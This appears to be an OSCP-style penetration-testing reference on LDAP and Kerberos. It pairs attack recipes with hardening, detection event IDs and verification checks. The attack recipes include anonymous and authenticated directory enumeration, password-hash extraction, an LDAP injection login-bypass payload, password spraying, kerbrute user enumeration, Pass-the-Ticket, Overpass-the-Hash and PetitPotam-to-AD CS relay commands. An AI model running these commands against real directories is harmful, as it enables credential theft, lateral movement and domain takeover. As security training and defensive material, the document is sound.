## 1. Overview

LDAP (Lightweight Directory Access Protocol) and Kerberos are the two
core protocols of directory-based authentication. LDAP provides
directory queries and (in some setups) authentication; Kerberos
provides ticket-based authentication. Both are heavily used by Active
Directory and by standalone Linux/Unix directory services.

This file covers LDAP and Kerberos at the protocol level. Active
Directory-specific attacks (Kerberoasting, DCSync, ACL abuse) live in
`01 Active Directory`.

**Core concepts - LDAP:**

- **Directory Information Tree (DIT)** - hierarchical namespace.
- **Entries** - objects in the tree (users, groups, computers, OUs).
- **Attributes** - properties of an entry (`cn`, `sn`, `mail`,
  `userPassword`, `memberOf`).
- **DN (Distinguished Name)** - full path to an entry, e.g.
  `cn=admin,dc=example,dc=com`.
- **Bind** - authentication operation (simple, SASL, anonymous).
- **Search** - query operation with filter, scope, attributes.
- **Modify** - write operation (add, delete, replace, increment).
- **Root DSE** - top of the tree, exposes server capabilities.

**Core concepts - Kerberos:**

- **KDC (Key Distribution Center)** - issues tickets.
- **TGT (Ticket Granting Ticket)** - short-lived ticket for the KDC.
- **TGS (Ticket Granting Service)** - service ticket for a specific
  service.
- **SPN (Service Principal Name)** - identifier of a service.
- **Realm** - Kerberos administrative domain (uppercase, e.g.
  `EXAMPLE.COM`).
- **Keytab** - file with service keys.
- **Principal** - identity in Kerberos (`user@REALM`).

**Ports:**

- 389/TCP - LDAP.
- 636/TCP - LDAPS (LDAP over TLS).
- 3268/TCP - Global Catalog (AD).
- 3269/TCP - Global Catalog over TLS (AD).
- 88/TCP + 88/UDP - Kerberos.
- 464/TCP + 464/UDP - Kerberos password change (kpasswd).
- 749/TCP - Kerberos administration (kadmin).

**Common software:**

- LDAP: OpenLDAP, 389 Directory Server, Active Directory, ApacheDS.
- Kerberos: MIT Kerberos, Heimdal, Active Directory.

## 2. Reconnaissance / Enumeration

**Offensive - LDAP enumeration (unauthenticated):**

    # Anonymous bind
    ldapsearch -x -H ldap://10.10.10.10 -b "dc=example,dc=com"

    # Root DSE (server info)
    ldapsearch -x -H ldap://10.10.10.10 -b "" -s base

    # Expected output:
    # dn:
    # namingContexts: dc=example,dc=com
    # supportedLDAPVersion: 3
    # supportedSASLMechanisms: GSSAPI, DIGEST-MD5, ...
    # subschemaSubentry: cn=Subschema

    # Naming contexts
    ldapsearch -x -H ldap://10.10.10.10 -b "" -s base namingContexts

**Offensive - LDAP enumeration (authenticated):**

    # Bind with credentials
    ldapsearch -x -H ldap://10.10.10.10 -D "cn=admin,dc=example,dc=com" -w <PASSWORD> -b "dc=example,dc=com"

    # Users
    ldapsearch -x -H ldap://10.10.10.10 -D "cn=admin,dc=example,dc=com" -w <PASSWORD> -b "dc=example,dc=com" "(objectClass=person)" cn mail

    # Groups
    ldapsearch -x -H ldap://10.10.10.10 -D "cn=admin,dc=example,dc=com" -w <PASSWORD> -b "dc=example,dc=com" "(objectClass=groupOfNames)" cn member

    # Expected output (users):
    # dn: cn=Alice,ou=People,dc=example,dc=com
    # cn: Alice
    # mail: alice@example.com
    #
    # dn: cn=Bob,ou=People,dc=example,dc=com
    # cn: Bob
    # mail: bob@example.com

**Offensive - LDAP with ldapsearch filters:**

    # Filter for a specific user
    ldapsearch -x -H ldap://10.10.10.10 -D "cn=admin,dc=example,dc=com" -w <PASSWORD> -b "dc=example,dc=com" "(cn=Alice)"

    # Filter for users with a specific attribute
    ldapsearch -x -H ldap://10.10.10.10 -D "cn=admin,dc=example,dc=com" -w <PASSWORD> -b "dc=example,dc=com" "(&(objectClass=person)(mail=*))"

    # All entries with a specific objectClass
    ldapsearch -x -H ldap://10.10.10.10 -D "cn=admin,dc=example,dc=com" -w <PASSWORD> -b "dc=example,dc=com" "(objectClass=organizationalUnit)"

**Offensive - LDAP enumeration with windapsearch (AD):**

    # Domain users
    windapsearch.py -d example.com --dc-ip 10.10.10.10 -U

    # Domain admins
    windapsearch.py -d example.com --dc-ip 10.10.10.10 -m "Domain Admins"

    # All computers
    windapsearch.py -d example.com --dc-ip 10.10.10.10 -C

    # Unconstrained delegation
    windapsearch.py -d example.com --dc-ip 10.10.10.10 --unconstrained-users
    windapsearch.py -d example.com --dc-ip 10.10.10.10 --unconstrained-computers

**Offensive - Kerberos enumeration:**

    # Enumerate users (Kerberos user enumeration)
    kerbrute userenum --dc 10.10.10.10 -d example.com users.txt

    # Expected output:
    # [+] VALID USERNAME: alice@example.com
    # [+] VALID USERNAME: bob@example.com
    # [+] VALID USERNAME: admin@example.com

    # Enumerate SPNs (Kerberoastable - AD-specific)
    GetUserSPNs.py example.com/user:password -dc-ip 10.10.10.10

    # Enumerate AS-REP roastable (AD-specific)
    GetNPUsers.py example.com/ -dc-ip 10.10.10.10 -usersfile users.txt

**Offensive - Kerberos attacks (with a captured ticket):**

    # Convert ccache <-> kirbi
    ticketConverter.py ticket.kirbi ticket.ccache
    ticketConverter.py ticket.ccache ticket.kirbi

    # Inspect a ticket
    klist -c ticket.ccache

    # Use a ticket
    export KRB5CCNAME=ticket.ccache
    smbclient //dc01.example.com/c$ -k -no-pass

**Defensive - what to baseline:**

- LDAP anonymous bind status.
- LDAP signing and channel binding requirements.
- LDAPS (TLS) enforcement.
- Kerberos encryption types allowed (RC4 vs AES).
- Kerberos pre-auth enforcement (no DONT_REQ_PREAUTH).
- Service principal names (SPN) on user accounts.
- Kerberos ticket lifetimes.
- Keytab files and their permissions.

## 3. Common Attack Vectors

**LDAP attacks:**

- **Anonymous bind** - if allowed, reveals directory structure.
- **Null bind** - equivalent to anonymous (empty DN + password).
- **Simple bind over cleartext** - credentials in the clear on
  port 389.
- **LDAP injection** - unvalidated input in LDAP filters.
- **LDAP relay** - NTLM relay to LDAP (see `01 Active Directory`).
- **Weak credentials** - brute force or password spray against LDAP
  bind.
- **Unencrypted LDAP** - LDAP without TLS exposes credentials and
  data.

**Kerberos attacks:**

- **Kerberoasting** - request TGS for SPN-holders, crack offline
  (see `01 Active Directory`).
- **AS-REP Roasting** - request AS-REP for accounts without pre-auth
  (see `01 Active Directory`).
- **Kerberos user enumeration** - discover valid usernames via AS-REQ
  responses.
- **Pass-the-Ticket** - use a captured ticket.
- **Overpass-the-Hash** - convert NTLM hash to Kerberos ticket.
- **Golden / Silver Ticket** - forge tickets with compromised keys
  (see `01 Active Directory`).
- **Kerberos relay** - relay Kerberos authentication (rare).
- **Unconstrained delegation** - capture TGTs of authenticating users.

**Combined:**

- **LDAP + Kerberos** - use LDAP to enumerate, Kerberos to
  authenticate.
- **LDAP relay + Kerberos delegation** - relay LDAP bind, then abuse
  delegation.

## 4. Exploitation Recipes

**LDAP anonymous bind enumeration:**

    # 1. Test anonymous bind
    ldapsearch -x -H ldap://10.10.10.10 -b "dc=example,dc=com"

    # 2. If successful, enumerate everything
    ldapsearch -x -H ldap://10.10.10.10 -b "dc=example,dc=com" "(objectClass=*)"

    # 3. Filter for users
    ldapsearch -x -H ldap://10.10.10.10 -b "dc=example,dc=com" "(objectClass=person)" cn mail

    # 4. Filter for groups
    ldapsearch -x -H ldap://10.10.10.10 -b "dc=example,dc=com" "(objectClass=groupOfNames)" cn member

**LDAP authenticated enumeration:**

    # 1. Bind with valid credentials
    ldapsearch -x -H ldap://10.10.10.10 -D "cn=admin,dc=example,dc=com" -w <PASSWORD> -b "dc=example,dc=com" "(objectClass=*)"

    # 2. Extract password hashes (if userPassword is readable)
    ldapsearch -x -H ldap://10.10.10.10 -D "cn=admin,dc=example,dc=com" -w <PASSWORD> -b "dc=example,dc=com" "(objectClass=person)" userPassword

    # Expected output:
    # userPassword:: e1NTSEF9...

**LDAP injection:**

    # Vulnerable web app filter (example):
    # (&(uid=$user)(password=$pass))
    #
    # Injection with $user = *)(uid=*))(|(uid=*
    # Results in: (&(uid=*)(uid=*))(|(uid=*)(password=$pass))
    #
    # Login bypass.

    # Test with curl
    curl "http://10.10.10.10/login?user=*)(uid=*))(|(uid=*&pass=x"

**LDAP password spray:**

    # 1. Prepare user list
    # 2. Prepare password list (careful: lockout policy)
    # 3. Spray with netexec
    netexec ldap 10.10.10.10 -u users.txt -p 'Winter2024!' --continue-on-success

    # Expected output:
    # LDAP  10.10.10.10  389  DC01  [+] example.com\alice:Winter2024!
    # LDAP  10.10.10.10  389  DC01  [-] example.com\bob:Winter2024! STATUS_LOGON_FAILURE

**Kerberos user enumeration with kerbrute:**

    # 1. Prepare user list
    # 2. Enumerate
    kerbrute userenum --dc 10.10.10.10 -d example.com users.txt

    # Expected output:
    # 2026/10/14 13:45:00 >  [+] VALID USERNAME: alice@example.com
    # 2026/10/14 13:45:00 >  [+] VALID USERNAME: bob@example.com
    # 2026/10/14 13:45:01 >  [+] VALID USERNAME: admin@example.com
    # 2026/10/14 13:45:01 >  Done! Tested 1000 usernames (3 valid) in 5.123 seconds

**Kerberos ticket inspection:**

    # 1. Inspect a ccache file
    klist -c ticket.ccache

    # Expected output:
    # Ticket cache: FILE:ticket.ccache
    # Default principal: alice@EXAMPLE.COM
    #
    # Valid starting     Expires            Service principal
    # 10/14/26 13:00:00  10/14/26 23:00:00  krbtgt/EXAMPLE.COM@EXAMPLE.COM
    # 10/14/26 13:01:00  10/14/26 23:00:00  cifs/dc01.example.com@EXAMPLE.COM

    # 2. Convert kirbi <-> ccache
    ticketConverter.py ticket.kirbi ticket.ccache

**Kerberos Pass-the-Ticket:**

    # 1. Set the ticket cache
    export KRB5CCNAME=/path/to/ticket.ccache

    # 2. Use it with impacket
    psexec.py -k -no-pass example.com/alice@dc01.example.com
    smbclient.py -k -no-pass example.com/alice@dc01.example.com

    # 3. Or with native tools
    klist
    smbclient //dc01.example.com/c$ -k -no-pass

**Kerberos Overpass-the-Hash:**

    # 1. Convert NTLM hash to Kerberos ticket
    getTGT.py -hashes :<NTLM_HASH> example.com/alice

    # 2. Set the ticket cache
    export KRB5CCNAME=alice.ccache

    # 3. Use it
    psexec.py -k -no-pass example.com/alice@dc01.example.com

**LDAP relay to AD CS (ESC8) - advanced:**

    # 1. Coerce a DC to authenticate to the attacker
    PetitPotam.py -d example.com -u user -p password 10.10.14.5 10.10.10.10

    # 2. Relay to the CA's HTTP endpoint
    ntlmrelayx.py -t http://ca01.example.com/certsrv/certfnsh.asp --adcs --template DomainController

    # 3. Get a certificate for the DC, authenticate with PKINIT
    # (See `01 Active Directory / 06 Privilege Escalation` for full chain.)

## 5. Post-Exploitation

**After LDAP enumeration:**

- Map the directory structure (users, groups, OUs, computers).
- Identify privileged accounts.
- Identify service accounts.
- Identify group memberships.
- Look for credentials in attributes (userPassword, description, info).
- Pivot to other services (SSH, SMB, web apps).

**After Kerberos attacks:**

- Use captured tickets for lateral movement.
- Use Kerberoasted credentials for lateral movement.
- Use AS-REP roasted credentials for lateral movement.
- Chain with ADCS for privilege escalation (see `01 Active Directory`).
- Establish persistence with Golden / Silver tickets (see
  `01 Active Directory`).

**Cleanup (blue team):**

- Disable anonymous LDAP bind.
- Enforce LDAPS (TLS).
- Enforce LDAP signing and channel binding.
- Enforce Kerberos pre-auth on all accounts.
- Remove SPNs from user accounts; use gMSA.
- Rotate KRBTGT after compromise.
- Monitor LDAP queries and Kerberos events.

## 6. Risk Context

LDAP and Kerberos are the authentication backbone of most enterprise
directories:

- A single LDAP bind credential often grants full directory read.
- Kerberoasting / AS-REP Roasting often yield service account
  credentials.
- Captured Kerberos tickets are reusable until expiry.

**Blast radius:** a compromised LDAP bind credential exposes the
directory; a captured Kerberos ticket grants the ticket owner's
privileges.

**Why attacks succeed:**

- Anonymous LDAP bind is still allowed in some environments.
- LDAP is often unencrypted.
- Kerberos pre-auth is disabled on some accounts.
- SPNs remain on user accounts.
- RC4 is still enabled in most ADs.
- Kerberos tickets are cached on workstations.

## 7. Root Causes

- **Anonymous LDAP bind.** Left enabled by default on some servers.
- **Unencrypted LDAP.** Credentials in the clear.
- **Weak credentials.** Sprayable.
- **SPN on user accounts.** Kerberoastable.
- **Pre-auth disabled.** AS-REP roastable.
- **RC4 enabled.** Kerberoastable faster.
- **Cached tickets.** Usable after compromise.

## 8. Preventive Controls

**LDAP hardening:**

- Disable anonymous bind.
- Enforce LDAPS (TLS) on all servers.
- Enforce LDAP signing and channel binding.
- Use strong bind credentials.
- Rotate bind credentials regularly.
- Monitor LDAP queries.

**Kerberos hardening:**

- Enforce pre-auth on all accounts.
- Remove SPNs from user accounts; use gMSA.
- Disable RC4; enforce AES.
- Shorten ticket lifetimes.
- Rotate KRBTGT regularly (and twice after compromise).
- Monitor Kerberos events (4768, 4769, 4771).

**Monitoring:**

- Log LDAP queries.
- Log Kerberos events.
- Alert on anonymous bind attempts.
- Alert on unusual LDAP queries.
- Alert on Kerberoasting patterns (4769 with RC4).

## 9. Detection Controls

**LDAP anonymous bind:**

- Audit logs: LDAP bind with empty DN.
- Alert on anonymous bind attempts.
- Baseline normal bind patterns.

**LDAP injection:**

- Web application logs: unusual filter characters (`*`, `(`, `)`).
- WAF rules for LDAP injection.

**LDAP password spray:**

- Event 4625 (failed logon) from a single source, many users.
- Event 4624 (successful logon) with a sudden pattern.
- Alert on lockout policy triggers.

**Kerberos user enumeration:**

- Event 4768 (TGT request) with `Pre-Authentication Type = 0` and
  unknown user.
- Event 4768 with a high volume from a single source.

**Kerberoasting:**

- Event 4769 (TGS request) with `Encryption Type = 0x17` (RC4).
- Event 4769 for accounts that never authenticate normally.
- Alert on volume.

**AS-REP Roasting:**

- Event 4768 with `Pre-Authentication Type = 0`.
- Alert on any such event.

**Pass-the-Ticket:**

- Event 4769 with a TGS requested by a user with no prior 4768.
- Event 4769 with an anomalous `Client Address`.

**General:**

- Forward LDAP and Kerberos logs to a SIEM.
- Baseline normal patterns; alert on anomalies.

## 10. Verification

**Offensive - did the attack succeed?**

- LDAP anonymous bind: directory contents retrieved.
- LDAP authenticated: full enumeration.
- LDAP injection: login bypass or data leak.
- LDAP password spray: valid credential found.
- Kerberos user enumeration: valid usernames discovered.
- Kerberoasting: TGS hash cracked offline.
- AS-REP Roasting: AS-REP hash cracked offline.
- Pass-the-Ticket: service accessed with captured ticket.

**Defensive - are controls effective?**

- Test anonymous LDAP: bind fails.
- Test LDAPS: TLS enforced; cleartext LDAP refused.
- Test LDAP signing: enforced.
- Test Kerberos pre-auth: all accounts require it.
- Test RC4: disabled; only AES allowed.
- Test SPN on users: removed.
- Test ticket lifetimes: short (10 hours).

## 11. OSCP Notes

- LDAP and Kerberos enumeration is common in OSCP AD machines.
- Practice: `ldapsearch`, `windapsearch`, `kerbrute`, `GetUserSPNs`,
  `GetNPUsers`.
- **Capture screenshots** of:
  - The LDAP enumeration output.
  - The Kerberos user enumeration output.
  - Any captured ticket (klist output).
- The `> [!IMPORTANT]` OSCP reporting note applies to any LDAP or
  Kerberos enumeration finding.

## 12. Production Notes

- LDAP anonymous bind is rare in mature environments but appears in
  legacy ones.
- LDAPS enforcement is standard in modern directories.
- Kerberoasting is still effective in most enterprises (RC4 enabled,
  weak service account passwords).
- AS-REP Roasting is rare in hardened environments.
- Monitor Kerberos events closely; they are the primary detection
  signal.

## 13. References

**RFCs and documentation:**

- RFC 4511 - LDAP: Protocol - https://www.rfc-editor.org/rfc/rfc4511
- RFC 4120 - Kerberos V5 - https://www.rfc-editor.org/rfc/rfc4120
- OpenLDAP documentation - https://www.openldap.org/doc/
- MIT Kerberos documentation - https://web.mit.edu/kerberos/
- Microsoft Kerberos documentation - https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview

**MITRE ATT&CK:**

- Credential Access - Steal or Forge Kerberos Tickets (T1558) - https://attack.mitre.org/techniques/T1558/
- Credential Access - Kerberoasting (T1558.003) - https://attack.mitre.org/techniques/T1558/003/
- Credential Access - AS-REP Roasting (T1558.004) - https://attack.mitre.org/techniques/T1558/004/
- Lateral Movement - Use Alternate Authentication Material (T1550) - https://attack.mitre.org/techniques/T1550/

**Tools:**

- ldapsearch - https://linux.die.net/man/1/ldapsearch
- windapsearch - https://github.com/ropnop/windapsearch
- kerbrute - https://github.com/ropnop/kerbrute
- GetUserSPNs.py / GetNPUsers.py (Impacket) - https://github.com/fortra/impacket
- Rubeus - https://github.com/GhostPack/Rubeus
- klist - https://linux.die.net/man/1/klist

**Research:**

- HackTricks - LDAP Pentesting - https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
- HackTricks - Kerberos Pentesting - https://book.hacktricks.xyz/network-services-pentesting/pentesting-kerberos-88
- ADSecurity.org - Kerberoasting - https://adsecurity.org/?p=2293
- ADSecurity.org - AS-REP Roasting - https://adsecurity.org/?p=1098
